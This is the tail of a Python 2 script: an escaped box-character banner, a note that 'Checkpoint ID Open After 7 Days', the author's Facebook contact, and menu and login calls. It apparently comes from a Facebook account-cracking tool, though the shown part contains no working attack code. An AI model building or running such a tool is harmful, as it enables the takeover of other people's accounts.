0\xe2\x95\x90\xe2\x95\xa6\xe2\x95\x97\xe2\x94\x80\xe2\x95\x94\xe2\x95\xa6\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\xa6\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\xa6\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\n\xe2\x95\x91\xe2\x95\x91\xe2\x95\x9a\xe2\x95\x9d\xe2\x95\x91\xe2\x95\x91\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\xa3\xe2\x95\x91\xe2\x94\x80\xe2\x95\x91\xe2\x95\x91\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\xa9\xe2\x95\x97\xe2\x95\x94\xe2\x95\x97\xe2\x95\xa0\xe2\x95\xa3\xe2\x95\xa0\xe2\x95\x9d\n\xe2\x95\x91\xe2\x95\x94\xe2\x95\x97\xe2\x95\x94\xe2\x95\x97\xe2\x95\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\xa3\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\n\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\xa3\xe2\x95\x94\xe2\x95\x90\xe2\x95\x97\xe2\x95\x91\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\n\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\xa3\xe2\x95\x91\xe2\x94\x80\xe2\x95\x91\xe2\x95\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\xa6\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x9d\xe2\x95\xa0\xe2\x95\xa3\xe2\x95\xa0\xe2\x95\x97\n\xe2\x95\x9a\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\xa9\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\xa9\xe2\x95\x9d\xe2\x94\x80\xe2\x95\x9a\xe2\x95\xa9\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\xa9\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\xa9\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\n                                                             \n      \n                       Checkpoint ID Open After 7 Days\n\n Having Problem Contact Me On Facebook :www.facebook.com/TheMehtan'
    raw_input('\n\x1b[1;93m[\x1b[1;96mBack\x1b[1;93m]')
    menu()


if __name__ == '__main__':
    login()
